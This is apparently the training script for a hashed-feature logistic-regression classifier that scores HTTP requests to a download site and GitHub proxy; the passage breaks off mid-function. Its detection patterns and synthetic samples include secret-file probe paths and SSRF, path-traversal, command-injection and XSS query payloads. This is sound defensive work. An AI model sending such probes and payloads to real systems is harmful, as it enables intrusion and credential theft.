// 轻量请求风险模型训练器 v2（逻辑回归 + 特征哈希）。
// 训练特征与 csh-api 运行时的 riskMlTokens() 保持完全一致（FEATURE_VERSION=risk-request-v2）。
//
// v2 相比 v1：
//   - 特征量化更细：4096 维、20 级长度桶、路径/查询字符构成、UA 长度、Range 起点、qset 等。
//   - 标签更贴近请求侧证据：扫描器/探测路径/危险参数为正，正常路径的 4xx 拒绝作为硬负样本。
//   - 训练集：真实日志 + 大规模合成语料（四个面、浏览器 UA 攻击、脚本 UA 正常调用、良性拒绝）。
//   - 全核并行：worker_threads 做超参搜索与 bagging；train/valConfig/valThreshold/test 四段切分。
//
// 用法:
//   node tools/train-risk-model.mjs [--input <dir|file> ...] [--out risk-model.json]
//     [--dim 4096] [--search 48] [--bags 8] [--synthetic 120000] [--workers 8] [--quick]
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import readline from 'node:readline';
import { fileURLToPath } from 'node:url';
import { Worker } from 'node:worker_threads';
import { sigmoid, summarize, bestThreshold, highThreshold, metricsAt } from './risk-metrics.mjs';

export const FEATURE_VERSION = 'risk-request-v2';
export const DEFAULT_DIM = 4096;
const KNOWN_HOSTS = new Set([
  'classsoftwarehub.cn', 'www.classsoftwarehub.cn', 'download.classsoftwarehub.cn',
  'api.classsoftwarehub.cn', 'submit.132614.xyz', '132614.xyz', 'xfane.com',
  '209.33.174.187', '8.159.148.101', '127.0.0.1', 'localhost',
]);
const PATH_KEYWORDS = [
  '.env', '.git', 'wp-admin', 'wp-login', 'wp-content', 'xmlrpc', 'phpmyadmin', 'adminer',
  'cgi-bin', 'actuator', 'swagger', 'graphql', 'console', 'manager', 'admin', 'login',
  'config', 'backup', 'database', 'dump', 'passwd', 'shadow', 'secret', 'token', 'shell',
  'webshell', 'vendor', 'debug', 'test', 'upload', 'install', 'setup', 'private',
];
const STRONG_PATH_KEYWORDS = [
  '.env', '.git', '.aws', '.ssh', 'wp-admin', 'wp-login', 'xmlrpc.php', 'phpmyadmin',
  'adminer', 'cgi-bin', 'actuator', 'swagger-ui', 'webshell', 'passwd', 'shadow',
  'id_rsa', '.ds_store', '/proc/self/', 'server-status', 'heapdump', 'jndi',
];
// 站点根目录出现这些扩展/备份后缀/指纹词，只可能是扫描器探测（站点本身是静态页 + API）。
const SITE_PROBE_EXT = /\.(?:php\d?|phtml|asp|aspx|jsp|jspx|cgi|pl|cfm)(?:\.(?:bak|old|save|swp|orig|tmp|txt|zip|tar|gz|sql))?$/i;
const SITE_PROBE_SUFFIX = /\.(?:bak|old|save|swp|orig|tmp|sql)$/i;
const SITE_PROBE_WORDS = [
  'phpinfo', 'firebase-adminsdk', 'server-info', 'server-status', 'filemanager', 'elfinder',
  'ckfinder', 'fckeditor', 'webdav', '/.svn', '/.hg', '/.ds_store', 'web.config',
  'eval-stdin', 'boaform', 'hnap1', 'gponform', 'solr/admin', 'jenkins/script', 'backup', 'dump',
  'keyfile', 'gcp-key', 'gcp-sa', 'service-account', 'credentials.json', 'private-key', 'aws-key',
  'firebase-key', '/key.json', 'google-key', '/sa.json',
];
const SENSITIVE_QUERY = ['url', 'file', 'path', 'cmd', 'exec', 'command', 'redirect', 'token', 'key', 'secret', 'password', 'passwd', 'callback', 'next'];
const ASSET_EXT = new Set(['js', 'css', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'map', 'webp', 'avif']);
const LEN_EDGES = [0, 4, 8, 12, 16, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048, 3072, 4096];
const RANGE_START_EDGES = [0, 1048576, 16777216, 268435456, 4294967296];

export function hashToken(str) {
  let h = 0x811c9dc5;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h >>> 0;
}
export function tokenIndex(tok, dim = DEFAULT_DIM) {
  return hashToken(tok) % dim;
}

function lenBucket(n, edges = LEN_EDGES) {
  for (let i = 1; i < edges.length; i++) if (n < edges[i]) return `${edges[i - 1]}-${edges[i]}`;
  return `>=${edges[edges.length - 1]}`;
}
function countBucket(n) {
  if (n <= 0) return '0';
  if (n === 1) return '1';
  if (n === 2) return '2';
  if (n <= 4) return '3-4';
  if (n <= 8) return '5-8';
  if (n <= 16) return '9-16';
  if (n <= 32) return '17-32';
  return '>32';
}
function ratioBucket(part, total) {
  if (!total) return '0';
  const r = part / total;
  if (!part) return '0';
  if (r < 0.1) return '<10%';
  if (r < 0.25) return '<25%';
  if (r < 0.5) return '<50%';
  if (r < 0.75) return '<75%';
  return '>=75%';
}
function safeExt(p) {
  const m = /\.([A-Za-z0-9]{1,8})$/.exec(p);
  return m ? m[1].toLowerCase() : '';
}
function normSeg(seg) {
  return String(seg || '').toLowerCase().replace(/[^a-z0-9_-]/g, '').slice(0, 24);
}
function nz(str) {
  const s = String(str || '').toLowerCase();
  if (!s) return '';
  return s.replace(/[^a-z0-9._-]/g, '') ? s : '';
}
export function uaClass(ua) {
  const s = String(ua || '').toLowerCase();
  if (!s) return { cls: 'empty', vendor: '' };
  if (/sqlmap|nikto|nmap|masscan|zgrab|nuclei|acunetix|nessus|w3af|dirbuster|gobuster|ffuf|feroxbuster|wpscan|xsstrike|commix|visionheight|zern-scanner|l9scan|leakix|censys|shodan|expanse|palo alto|cortex-xpanse|binaryedge|netlas|onyphe|internet-measurement|securitytrails|driftnet|\bscan(?:ner)?\b/.test(s)) return { cls: 'scanner', vendor: '' };
  if (/python-requests|python-urllib|aiohttp|httpx|scrapy/.test(s)) return { cls: 'python', vendor: '' };
  if (/curl\//.test(s)) return { cls: 'curl', vendor: '' };
  if (/wget\//.test(s)) return { cls: 'wget', vendor: '' };
  if (/^git\/|git\/\d/.test(s)) return { cls: 'git', vendor: '' };
  if (/docker\/|containerd|skopeo|podman/.test(s)) return { cls: 'container', vendor: '' };
  if (/npm\/|yarn\/|pnpm\/|pip\/|cargo\/|composer\//.test(s)) return { cls: 'pkg', vendor: '' };
  if (/go-http-client|golang/.test(s)) return { cls: 'go', vendor: '' };
  if (/okhttp|java\/|httpclient|apache-httpclient/.test(s)) return { cls: 'java', vendor: '' };
  if (/node-fetch|axios|undici/.test(s)) return { cls: 'node', vendor: '' };
  if (/bot|crawler|spider|headlesschrome|phantomjs/.test(s)) return { cls: 'bot', vendor: '' };
  if (/mozilla|chrome|safari|firefox|edg\/|opr\//.test(s)) {
    const mobile = /mobile|android|iphone|ipad|harmonyos/.test(s) ? 'mobile' : 'desktop';
    const vendor = /edg\//.test(s) ? 'edge' : /firefox/.test(s) ? 'firefox' : /opr\//.test(s) ? 'opera' : /chrome/.test(s) ? 'chrome' : 'safari';
    return { cls: `browser-${mobile}`, vendor };
  }
  return { cls: 'other', vendor: '' };
}
function refClass(referer) {
  const s = String(referer || '').trim();
  if (!s) return 'none';
  try {
    const u = new URL(s);
    if (u.hostname === '127.0.0.1' || u.hostname === 'localhost') return 'local';
    if (KNOWN_HOSTS.has(u.hostname.toLowerCase())) return 'known';
    return 'external';
  } catch { return 'bad'; }
}
function acceptClass(accept) {
  const s = String(accept || '').toLowerCase();
  if (!s) return 'none';
  if (s.includes('text/html')) return 'html';
  if (s.includes('application/json')) return 'json';
  if (s.includes('image/')) return 'image';
  if (s.includes('application/octet-stream') || s.includes('application/zip') || s.includes('application/x-')) return 'binary';
  if (s.includes('text/event-stream')) return 'stream';
  if (s.includes('text/')) return 'text';
  if (s.includes('*/*')) return 'any';
  return 'other';
}
function rangeClass(range) {
  const s = String(range || '').trim().toLowerCase();
  if (!s) return 'none';
  if (s.includes(',')) return 'multi';
  const m = /^bytes=(\d*)-(\d*)$/.exec(s);
  if (!m) return 'bad';
  if (!m[1] && m[2]) return 'suffix';
  if (m[1] && !m[2]) return 'open';
  const start = Number(m[1]);
  const end = Number(m[2]);
  if (Number.isFinite(end) && end - start > 100 * 1024 * 1024) return 'huge';
  return 'single';
}
function rangeStart(range) {
  const m = /^bytes=(\d+)-/.exec(String(range || '').trim());
  return m ? Number(m[1]) : 0;
}
function hostClass(host) {
  const h = String(host || '').toLowerCase().split(':')[0];
  if (!h) return 'none';
  return KNOWN_HOSTS.has(h) ? 'known' : 'other';
}
function pathTraits(p) {
  const s = String(p || '');
  const lower = s.toLowerCase();
  const out = [];
  if (lower.includes('..') || lower.includes('%2e%2e') || lower.includes('%252e')) out.push('traversal');
  if (lower.includes('%00') || lower.includes('\0')) out.push('nullbyte');
  if (/\/\//.test(s)) out.push('doubleslash');
  if (lower.includes('${') || lower.includes('jndi')) out.push('jndi');
  const enc = (s.match(/%[0-9a-f]{2}/gi) || []).length;
  out.push(`enc:${countBucket(enc)}`);
  out.push(`dig:${ratioBucket((s.match(/\d/g) || []).length, s.length)}`);
  out.push(`up:${ratioBucket((s.match(/[A-Z]/g) || []).length, s.length)}`);
  out.push(`sp:${countBucket((s.match(/[^A-Za-z0-9/._~-]/g) || []).length)}`);
  out.push(`dot:${countBucket((s.match(/\./g) || []).length)}`);
  return out;
}

/** 与运行时共用的特征 token 生成器。ev = {service, method, path, query, headers, host, http}；headers 用小写键。 */
export function riskMlTokens(ev) {
  const method = String(ev.method || 'GET').toUpperCase();
  const service = ['download', 'oss', 'mirror', 'site'].includes(ev.service) ? ev.service : 'site';
  const rawPath = String(ev.path || '/');
  const query = String(ev.query || '').replace(/^\?/, '');
  const headers = ev.headers || {};
  const ua = headers['user-agent'] || headers['User-Agent'] || '';
  const referer = headers.referer || headers.Referer || '';
  const accept = headers.accept || headers.Accept || '';
  const range = headers.range || headers.Range || '';
  const xff = headers['x-forwarded-for'] || headers['X-Forwarded-For'] || '';
  const host = ev.host || headers.host || headers.Host || '';
  const proto = ev.proto || headers['x-forwarded-proto'] || '';
  const httpVer = ev.http || headers[':version'] || '';

  const tokens = [`svc:${service}`, `m:${method}`, `ms:${method}:${service}`];
  const pathOnly = rawPath.split('?')[0] || '/';
  const segs = pathOnly.split('/').filter(Boolean);
  const lowerPath = pathOnly.toLowerCase();
  const ext = safeExt(lowerPath);

  tokens.push(`plen:${lenBucket(pathOnly.length)}`);
  tokens.push(`pdepth:${Math.min(12, segs.length)}`);
  tokens.push(`pext:${ext || 'none'}`);
  if (!segs.length) tokens.push('proot');
  if (ASSET_EXT.has(ext)) tokens.push('passet');
  if (segs.length) tokens.push(`pfirst:${normSeg(segs[0]) || 'empty'}`);
  if (segs.length > 1) tokens.push(`plast:${normSeg(segs[segs.length - 1]) || 'empty'}`);
  if (segs[0] === 'gh') {
    tokens.push('pgh');
    if (segs[1]) tokens.push(`pgh2:${normSeg(segs[1])}`);
    if (segs[1] === 'api' || segs[1] === 'api.github.com') tokens.push('pghapi');
  }
  if (segs[0] === 'api' && segs[1]) tokens.push(`papi2:${normSeg(segs[1])}`);
  for (const kw of PATH_KEYWORDS) if (lowerPath.includes(kw)) tokens.push(`pk:${kw}`);
  for (const t of pathTraits(pathOnly)) tokens.push(`pt:${t}`);
  if (/\/api(\/|$)/.test(lowerPath)) tokens.push('papi');
  if (/\/(login|signin|signup|register|auth)(\/|$)/.test(lowerPath)) tokens.push('pauth');
  if (segs.length) {
    const last = segs[segs.length - 1];
    if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(last)) tokens.push('puuid');
    else if (/^[0-9a-f]{32,128}$/i.test(last)) tokens.push('phex');
    else if (/^\d{1,12}$/.test(last)) tokens.push('pnum');
    else if (last.startsWith('.')) tokens.push('pdotfile');
    else if (last.length >= 24 && /[a-z]/i.test(last) && /\d/.test(last)) tokens.push('prand');
  }

  let qp = null;
  try { qp = new URLSearchParams(query); } catch {}
  const qkeys = qp ? Array.from(new Set(qp.keys())) : [];
  let qpairs = 0;
  tokens.push(`qkeys:${countBucket(qkeys.length)}`);
  tokens.push(`qlen:${lenBucket(query.length)}`);
  for (const k of qkeys.slice(0, 8)) tokens.push(`qk:${normSeg(k) || 'empty'}`);
  for (const k of SENSITIVE_QUERY) if (qkeys.includes(k)) tokens.push(`qsens:${k}`);
  if (qp) {
    for (const [k, v] of qp) {
      qpairs++;
      const val = String(v || '');
      if (/^https?:\/\//i.test(val)) tokens.push('qhttp');
      if (val.includes('..')) tokens.push('qtraversal');
      if (/<script|javascript:|onerror=/i.test(val)) tokens.push('qxss');
      if (val.length > 200) tokens.push('qverylong');
      if (SENSITIVE_QUERY.includes(k) && /^[A-Za-z0-9+/=_-]{16,}$/.test(val)) tokens.push('qopaque');
      if (k === 'url' || k === 'redirect' || k === 'next') tokens.push(`qredirect:${refClass(val)}`);
      if (/^\d+$/.test(val)) tokens.push('qnum');
      if (/^[0-9a-f]{16,}$/i.test(val)) tokens.push('qhex');
      if (/^eyJ[A-Za-z0-9_-]{8,}/.test(val)) tokens.push('qjwt');
      if (val.includes('/')) tokens.push('qpath');
      if (/\s/.test(val)) tokens.push('qspace');
      if (/['"]/.test(val)) tokens.push('qquote');
      if (/[<>]/.test(val)) tokens.push('qangle');
      if (/[;|`]/.test(val)) tokens.push('qshell');
    }
  }
  tokens.push(`qpairs:${countBucket(qpairs)}`);
  if (qpairs > qkeys.length) tokens.push('qdup');
  if (qkeys.length) tokens.push(`qset:${qkeys.slice(0, 4).map(normSeg).filter(Boolean).sort().join('+')}`);

  const uaInfo = uaClass(ua);
  tokens.push(`ua:${uaInfo.cls}`);
  if (uaInfo.vendor) tokens.push(`uav:${uaInfo.vendor}`);
  tokens.push(`ualen:${lenBucket(String(ua).length)}`);
  tokens.push(`ref:${refClass(referer)}`);
  tokens.push(`accept:${acceptClass(accept)}`);
  tokens.push(`range:${rangeClass(range)}`);
  const rs = rangeStart(range);
  if (rs) tokens.push(`rstart:${lenBucket(rs, RANGE_START_EDGES)}`);
  const hops = xff ? String(xff).split(',').filter(Boolean).length : 0;
  tokens.push(`xff:${countBucket(hops)}`);
  if (headers.authorization || headers.Authorization) tokens.push('h:auth');
  if (headers.cookie || headers.Cookie) tokens.push('h:cookie');
  if (headers.origin || headers.Origin) tokens.push('h:origin');
  if (headers['content-type'] || headers['Content-Type']) tokens.push('h:ctype');
  tokens.push(`host:${hostClass(host)}`);
  if (proto) tokens.push(`proto:${String(proto).toLowerCase() === 'https' ? 'https' : 'http'}`);
  if (httpVer) tokens.push(`http:${String(httpVer).replace(/[^0-9.]/g, '').slice(0, 4)}`);
  return tokens;
}

/** 稠密向量供运行时对齐测试使用；训练内部用 vectorizeSparse。 */
export function vectorize(tokens, dim = DEFAULT_DIM) {
  const counts = new Map();
  for (const t of tokens) {
    const i = tokenIndex(t, dim);
    counts.set(i, (counts.get(i) || 0) + 1);
  }
  const x = new Float32Array(dim);
  let norm = 0;
  for (const [i, c] of counts) {
    const v = Math.min(3, c);
    x[i] = v;
    norm += v * v;
  }
  norm = Math.sqrt(norm) || 1;
  for (let i = 0; i < dim; i++) if (x[i]) x[i] /= norm;
  return x;
}

function vectorizeSparse(tokens, dim) {
  const counts = new Map();
  for (const t of tokens) {
    const i = tokenIndex(t, dim);
    counts.set(i, (counts.get(i) || 0) + 1);
  }
  const idx = [];
  const val = [];
  let norm = 0;
  for (const [i, c] of counts) {
    const v = Math.min(3, c);
    idx.push(i);
    val.push(v);
    norm += v * v;
  }
  norm = Math.sqrt(norm) || 1;
  for (let i = 0; i < val.length; i++) val[i] /= norm;
  return { idx: Uint32Array.from(idx), val: Float32Array.from(val) };
}

function suspiciousPath(p, service = 'site') {
  let s = String(p || '').toLowerCase();
  if (s.includes('..') || s.includes('%2e%2e') || s.includes('%252e') || s.includes('%00')) return true;
  // /gh/ 是 GitHub 全站代理的正常浏览路径，仓库名里出现 admin/vendor 等词不算扫描。
  if (s.startsWith('/gh/') || s.startsWith('/__csh_internal/')) {
    return /\/\.(git|env|aws|ssh|svn|hg)/.test(s) || s.includes('jndi') || /%2e%2e|%00|%252e/.test(s);
  }
  if (service === 'site') {
    if (s === '/admin' || s.startsWith('/admin/')) return true;
    if (s.startsWith('/.git') || s.startsWith('/.env') || s.startsWith('/.aws') || s.startsWith('/.ssh')) return true;
    if (SITE_PROBE_EXT.test(s) || SITE_PROBE_SUFFIX.test(s)) return true;
    if (SITE_PROBE_WORDS.some((kw) => s.includes(kw))) return true;
  }
  return STRONG_PATH_KEYWORDS.some((kw) => s.includes(kw));
}
function suspiciousQuery(q) {
  const s = String(q || '').toLowerCase();
  if (!s) return false;
  if (s.includes('..') || s.includes('%00') || s.includes('%2e%2e')) return true;
  if (/<script|javascript:|onerror=/.test(s)) return true;
  if (/(?:^|&)(cmd|exec|command|shell)=/.test(s)) return true;
  if (/(?:^|&)(url|redirect|next|callback)=.*(?:https?:|169\.254|127\.0\.0\.1|localhost)/.test(s)) return true;
  return false;
}

/** 弱监督标签：只看请求侧证据；响应状态仅用于区分“正常拒绝”和“不可判定”。 */
export function labelOf(ev) {
  const status = Number(ev.status) || 0;
  const path = String(ev.path || '');
  const query = String(ev.query || '');
  const headers = ev.headers || {};
  const ua = uaClass(headers['user-agent'] || headers['User-Agent']);
  const method = String(ev.method || 'GET').toUpperCase();
  const badMethod = !['GET', 'HEAD', 'POST', 'OPTIONS', 'PUT', 'DELETE', 'PATCH'].includes(method);
  const normalUa = ua.cls.startsWith('browser') || ['curl', 'wget', 'python', 'go', 'java', 'node', 'git', 'pkg', 'container'].includes(ua.cls);

  if (status === 444) return 1; // nginx 滥用断连
  if (ua.cls === 'scanner' || badMethod) return 1;
  if (suspiciousPath(path, ev.service) || suspiciousQuery(query)) return 1;
  if (ev.service === 'oss' && ev.op === 'auth') return 1; // 无效 API KEY 探测
  if (ev.op === 'auth' && status === 401 && !normalUa) return 1;
  if (status >= 200 && status < 500 && normalUa) return 0;
  return null;
}

function isoMs(v) {
  const t = Date.parse(v);
  return Number.isFinite(t) ? t : 0;
}
function serviceHint(file) {
  const s = file.replace(/\\/g, '/');
  if (s.includes('gh-stream')) return 'download';
  if (s.includes('oss-relay') || s.includes('/oss/')) return 'oss';
  if (s.includes('gh-mirror')) return 'mirror';
  if (s.includes('gh-web-proxy') || s.includes('/nginx/')) return 'site';
  return '';
}
export function eventFromLog(raw, hint = '') {
  if (!raw || typeof raw !== 'object') return null;
  const ts = isoMs(raw.ts);
  if (!ts) return null;
  const headers = {
    'user-agent': raw.ua || '',
    referer: raw.referer || '',
    range: raw.range || '',
    accept: raw.accept || '',
    'x-forwarded-for': raw.xff || '',
    host: raw.host || '',
  };
  let service = hint;
  if (raw.request_uri || raw.server_port) service = 'site';
  else if (raw.via === 'oss-relay' || raw.key) service = 'oss';
  else if (raw.via === 'gh-mirror') service = 'mirror';
  else if (raw.target || raw.via) service = 'download';
  if (!service) return null;

  let p = '/';
  let q = '';
  if (service === 'site') {
    p = String(raw.uri || raw.request_uri || '/');
    const ru = String(raw.request_uri || '');
    const qi = ru.indexOf('?');
    if (qi >= 0) q = ru.slice(qi + 1);
  } else if (service === 'oss') {
    p = `/${String(raw.key || raw.file || '')}`;
    const t = String(raw.target || '');
    const qi = t.indexOf('?');
    if (!raw.key && !raw.file && t) { p = t.slice(0, qi < 0 ? t.length : qi); }
    else if (qi >= 0) q = t.slice(qi + 1);
  } else {
    try {
      const u = new URL(raw.target || '');
      p = u.pathname || '/';
      q = u.search.replace(/^\?/, '');
    } catch {}
  }
  headers.host = String(raw.host || '');
  return {
    ts,
    service,
    method: raw.method || 'GET',
    path: p,
    query: q,
    headers,
    host: headers.host,
    status: Number(raw.status) || 0,
    op: raw.op || '',
    ip: raw.ip || '',
  };
}

function isPrivateIp(ip) {
  const s = String(ip || '');
  if (!s) return true;
  if (s === '::1' || s.startsWith('127.')) return true;
  if (/^10\./.test(s)) return true;
  if (/^192\.168\./.test(s)) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(s)) return true;
  if (s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80')) return true;
  return false;
}

export function* walkFiles(target) {
  let st;
  try { st = fs.statSync(target); } catch { return; }
  if (st.isFile()) { yield target; return; }
  if (!st.isDirectory()) return;
  for (const name of fs.readdirSync(target)) {
    const p = path.join(target, name);
    let s;
    try { s = fs.lstatSync(p); } catch { continue; }
    if (s.isDirectory()) yield* walkFiles(p);
    else if (/\.(jsonl|log)(\..+)?$/.test(name) || /\.gz$/.test(name)) yield p;
  }
}
async function* linesOf(file) {
  const isGz = /\.gz$/i.test(file);
  const input = fs.createReadStream(file);
  const stream = isGz ? input.pipe(zlib.createGunzip()) : input;
  const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });
  for await (const line of rl) yield line;
}

// ---------------------------------------------------------------------------
// 合成语料：覆盖四个面、正常自动化、良性拒绝与常见攻击手法
// ---------------------------------------------------------------------------
const OWNERS = ['pang-zhengyang', 'octocat', 'microsoft', 'nodejs', 'torvalds', 'vercel', 'rust-lang', 'python', 'electron', 'go-gitea', 'git-lfs'];
const REPOS = ['ClassSoftwareHub', 'Hello-World', 'vscode', 'node', 'linux', 'next.js', 'cargo', 'cpython', 'electron', 'gitea', 'git-lfs'];
const BRANCHES = ['main', 'master', 'dev', 'release/1.2', 'v2'];
const ASSETS = ['Setup-1.2.3.exe', 'app-v2.1.0.zip', 'tool-x64.dmg', 'lib-1.0.tar.gz', 'checksums.txt', 'source.zip', 'update.pkg', 'client-arm64.apk'];
const FILES = ['package.json', 'README.md', 'LICENSE', 'index.html', 'app.js', 'config.yaml', 'src/main.rs'];
const HOSTS = ['download.classsoftwarehub.cn', 'gh.classsoftwarehub.cn', '209.33.174.187', 'api.classsoftwarehub.cn'];
const BROWSER_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0',
];
const SCRIPT_UAS = ['curl/8.4.0', 'curl/7.81.0', 'python-requests/2.31.0', 'python-urllib/3.11', 'Wget/1.21.4', 'Go-http-client/1.1', 'node-fetch/3.3.2', 'axios/1.6.0', 'okhttp/4.12.0', 'Java/17.0.9'];
const SCANNER_UAS = [
  'sqlmap/1.7', 'Nikto/2.1.6', 'nuclei/3.1.0', 'ffuf/2.1.0', 'gobuster/3.6', 'zgrab/0.x', 'masscan/1.3',
  'visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36',
  'Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity',
  'Mozilla/5.0 (l9scan/2.0.738313e2437313e23333e2930323; +https://leakix.net)',
  'python-requests/2.31.0 (security scanner)',
];
const PROBE_PATHS = [
  '/.env', '/.git/config', '/.aws/credentials', '/.ssh/id_rsa', '/wp-admin/', '/wp-login.php', '/xmlrpc.php',
  '/phpmyadmin/', '/adminer.php', '/cgi-bin/luci', '/actuator/env', '/actuator/heapdump', '/swagger-ui.html',
  '/v2/api-docs', '/graphql', '/console', '/manager/html', '/server-status', '/debug/pprof/', '/backup.sql',
  '/database.sql', '/config.php.bak', '/index.php.bak', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
  '/owa/auth/logon.aspx', '/solr/admin/cores', '/jenkins/script', '/boaform/admin/formLogin', '/HNAP1/',
  '/GponForm/diag_Form', '/cgi-bin/../../etc/passwd', '/.well-known/security.txt', '/jkstatus',
  '/phpinfo.php', '/info.php', '/phpinfo.php.bak', '/php-info.php', '/debug.php', '/test.php',
  '/.env1', '/.env.bak', '/.env.local', '/.env.production', '/var/www/html/.env', '/.git/HEAD',
  '/.svn/entries', '/.DS_Store', '/firebase-adminsdk.json', '/server-info', '/wp-config.php.bak',
  '/backup.zip', '/www.zip', '/db.sql', '/dump.sql', '/.vscode/sftp.json', '/docker-compose.yml',
  '/keyfile.json', '/gcp-key.json', '/gcp-sa.json', '/key.json', '/credentials.json', '/service-account.json',
  '/aws-key.json', '/private-key.pem',
];
const ATTACK_QUERIES = [
  'url=http://169.254.169.254/latest/meta-data/', 'url=http://127.0.0.1:8080/admin', 'file=../../etc/passwd',
  'path=../../../etc/shadow', 'cmd=id', 'exec=whoami', 'command=cat%20/etc/passwd',
  'q=%3Cscript%3Ealert(1)%3C/script%3E', 'next=javascript:alert(1)', 'token=AAAAAAAAAAAAAAAAAAAAAAAA',
  'key=0123456789abcdef0123456789abcdef', 'redirect=http://evil.example.com/',
];
const TRACE_METHODS = ['TRACE', 'CONNECT', 'PRI', 'FOO', 'PROPFIND'];

function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const pick = (r, arr) => arr[Math.floor(r() * arr.length)];
const chance = (r, p) => r() < p;
const randInt = (r, a, b) => a + Math.floor(r() * (b - a + 1));
const randHex = (r, n) => Array.from({ length: n }, () => '0123456789abcdef'[Math.floor(r() * 16)]).join('');
const randName = (r) => `${pick(r, ['app', 'tool', 'client', 'patch', 'setup', 'lib', 'sdk'])}-${randInt(r, 1, 9)}.${randInt(r, 0, 30)}.${randInt(r, 0, 99)}`;

function ev(service, method, p, status, headers, extra = {}) {
  const qIdx = p.indexOf('?');
  return {
    ts: extra.ts || 0,
    service,
    method,
    path: qIdx >= 0 ? p.slice(0, qIdx) : p,
    query: qIdx >= 0 ? p.slice(qIdx + 1) : '',
    headers,
    host: headers.host || '',
    status,
    op: extra.op || '',
    ip: extra.ip || '',
  };
}

function legitEvent(r) {
  const service = pick(r, ['site', 'site', 'site', 'site', 'download', 'download', 'oss', 'oss', 'mirror']);
  const browser = pick(r, BROWSER_UAS);
  const script = pick(r, SCRIPT_UAS);
  const host = pick(r, HOSTS);
  const ref = chance(r, 0.6) ? (chance(r, 0.8) ? `https://${pick(r, ['classsoftwarehub.cn', 'www.classsoftwarehub.cn'])}/` : '') : '';
  if (service === 'site') {
    const kind = pick(r, ['home', 'repo', 'release', 'asset', 'api', 'docs']);
    let p = '/';
    let q = '';
    if (kind === 'repo') p = `/gh/${pick(r, OWNERS)}/${pick(r, REPOS)}`;
    else if (kind === 'release') p = `/gh/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/tag/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}.${randInt(r, 0, 9)}`;
    else if (kind === 'asset') p = `/assets/index-${randHex(r, 8)}.js`;
    else if (kind === 'docs') p = `/docs/${pick(r, ['install', 'usage', 'faq', 'legal/privacy'])}`;
    else if (kind === 'api') {
      p = pick(r, ['/api/status', '/api/dl-mode', '/api/files', '/api/oss-sign', '/api/sign', '/gh/api.github.com/rate_limit']);
      if (p === '/api/files') q = `source=${pick(r, ['bucket', 'cache'])}&prefix=${pick(r, ['release/', 'icon/', 'gh-mirror/'])}`;
    }
    const useScript = kind === 'api' || chance(r, 0.15);
    const headers = {
      'user-agent': useScript ? script : browser,
      referer: ref,
      accept: kind === 'api' ? 'application/json' : 'text/html,application/xhtml+xml,*/*;q=0.8',
      host,
    };
    if (kind === 'api') headers.authorization = `Bearer ${randHex(r, 40)}`;
    if (!useScript) headers.cookie = 'csh_session=ok';
    if (chance(r, 0.1)) headers['x-forwarded-for'] = `198.51.100.${randInt(r, 1, 254)}`;
    return { ev: ev('site', pick(r, ['GET', 'GET', 'GET', 'HEAD', 'POST']), q ? `${p}?${q}` : p, pick(r, [200, 200, 200, 304, 301, 302, 204]), headers), y: 0 };
  }
  if (service === 'download') {
    const p = pick(r, [
      `/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/download/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}.${randInt(r, 0, 9)}/${pick(r, ASSETS)}`,
      `/${pick(r, OWNERS)}/${pick(r, REPOS)}/archive/refs/tags/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}.zip`,
      `/${pick(r, OWNERS)}/${pick(r, REPOS)}/raw/${pick(r, BRANCHES)}/${pick(r, FILES)}`,
    ]);
    const range = chance(r, 0.35) ? `bytes=${randInt(r, 0, 50) * 1048576}-${randInt(r, 50, 200) * 1048576}` : '';
    return { ev: ev('download', 'GET', p, pick(r, [200, 200, 206, 206, 304]), { 'user-agent': chance(r, 0.8) ? browser : script, referer: ref, accept: 'application/octet-stream,*/*', range, host }), y: 0 };
  }
  if (service === 'oss') {
    const key = chance(r, 0.6) ? `gh-mirror/${randHex(r, 64)}` : `icon/2026/${String(randInt(r, 1, 12)).padStart(2, '0')}/${randName(r)}.jpg`;
    const range = chance(r, 0.2) ? `bytes=${randInt(r, 0, 20) * 1048576}-` : '';
    const accept = pick(r, ['image/*,*/*', '*/*', 'image/*', 'application/octet-stream,*/*']);
